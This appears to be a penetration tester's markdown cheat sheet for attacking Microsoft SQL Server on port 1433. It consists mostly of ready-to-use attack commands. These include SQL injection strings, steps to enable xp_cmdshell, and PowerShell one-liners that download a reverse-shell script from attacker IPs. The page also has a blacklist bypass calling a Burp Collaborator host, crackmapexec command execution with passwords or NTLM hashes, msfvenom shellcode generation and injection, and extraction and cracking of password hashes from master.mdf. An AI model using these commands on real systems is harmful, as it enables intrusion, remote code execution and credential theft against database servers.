---
description: a' or 1=1-- | a' or '1'='1
---

# MSSQL 1433

Note that in order to be able to execute commands it's not only necessary to have **`xp_cmdshell`** **enabled**, but also have the **EXECUTE permission on the `xp_cmdshell` stored procedure**. You can get who (except sysadmins) can use **`xp_cmdshell`** with:

```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```

Check if current user is sysadmin

```sql
SELECT is_srvrolemember('sysadmin');
```

a' UNION all SELECT null,2; EXEC .....

{% code overflow="wrap" %}
```sql
# mssql account
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.119.129:8000/rev.ps1") | powershell -noprofile'
or
EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://192.168.119.173/rev.ps1'')'--
# try master..xp_cmdshell

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
{% endcode %}

#### CME

{% code overflow="wrap" %}
```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.173 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw -o shell.bin

crackmapexec mssql 10.0.5.1 -u Administrator -p P@ss123 --local-auth -M shellcode_inject -o PATH=/path/to/shell.bin

-H nthash
```
{% endcode %}

### db.mdf db account hash crack

{% embed url="https://blog.xpnsec.com/extracting-master-mdf-hashes/" %}
john --wordlist=/usr/share/wordlists/rockyou.txt hash
{% endembed %}

```powershell
git clone https://github.com/xpn/Powershell-PostExploitation   
pwsh
Add-Type -Path ./OrcaMDF.Framework.dll
Add-Type -Path ./OrcaMDF.RawCore.dll 
import-module ./Get-MDFHashes.ps1   
Get-MDFHashes -mdf ./master.mdf   
```

